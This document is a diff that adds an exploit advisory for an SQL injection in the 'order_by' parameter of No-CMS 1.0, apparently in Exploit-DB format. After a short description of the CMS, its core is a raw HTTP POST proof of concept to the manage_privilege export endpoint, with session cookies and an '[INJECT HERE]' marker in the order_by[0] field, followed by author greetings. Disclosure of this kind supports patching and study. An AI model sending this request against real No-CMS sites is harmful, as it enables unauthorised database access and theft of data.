@@ -1,0 +1,42 @@
+# Exploit Title: No-Cms 1.0 - 'order_by' SQL Injection
+# Date: 2018-11-28
+# Exploit Author: Loading Kura Kura  
+# Vendor Homepage: https://github.com/goFrendiAsgard/No-CMS
+# Software Link: https://codeload.github.com/goFrendiAsgard/No-CMS/zip/master
+# Tested on: Win10/Kali Linux
+# Google Dork: n/a
+# Version: n/a
+# CVE : 
+
+# No-CMS is a CMS-framework.
+# No-CMS is a basic and "less-assumption" CMS with some default features such as 
+# user authorization (including third party authentication), menu, module and theme management.
+# It is fully customizable and extensible, you can make your own module and your own themes.
+# It provide freedom to make your very own CMS, which is not provided very well by any other CMS.
+
+# POC
+#Sqli injection { order_by[0] }
+
+POST /nocms/main/manage_privilege/index/export HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/nocms/main/manage_privilege
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Connection: close
+Cookie: bb9865483ae270ceba27539501d10599=rf0at4ehbd1ttckd85skvf17ssq4dfh2; crud_page_a36781f1e31bde68770f40381aad7df6=1; per_page_a36781f1e31bde68770f40381aad7df6=25; hidden_ordering_a36781f1e31bde68770f40381aad7df6=asc; hidden_sorting_a36781f1e31bde68770f40381aad7df6=index; search_text_a36781f1e31bde68770f40381aad7df6=; search_field_a36781f1e31bde68770f40381aad7df6=; 3c158ec1144ba8bb0dd8a7ca03988b5c=e4p2j92lle03vpp6ccuv2c8dro86ebep; crud_page_710a7d8c82ae37e845c3da5df1073379=1; per_page_710a7d8c82ae37e845c3da5df1073379=25; hidden_ordering_710a7d8c82ae37e845c3da5df1073379=desc; hidden_sorting_710a7d8c82ae37e845c3da5df1073379=date; search_text_710a7d8c82ae37e845c3da5df1073379=dd; search_field_710a7d8c82ae37e845c3da5df1073379=sec0e67fc; __secret_code=d282ef263719ab842e05
+Upgrade-Insecure-Requests: 1
+
+search_text=&search_field=/**/&per_page=25&order_by[0]=[INJECT HERE]&order_by[1]=&page=1
+
+=========================
+Regards 
+Loading Kura Kura
+thanks To :
+Siluman IWAK 
+Siluman Cupatkai
+Siluman TUMO 
+dan kamu sayang :*
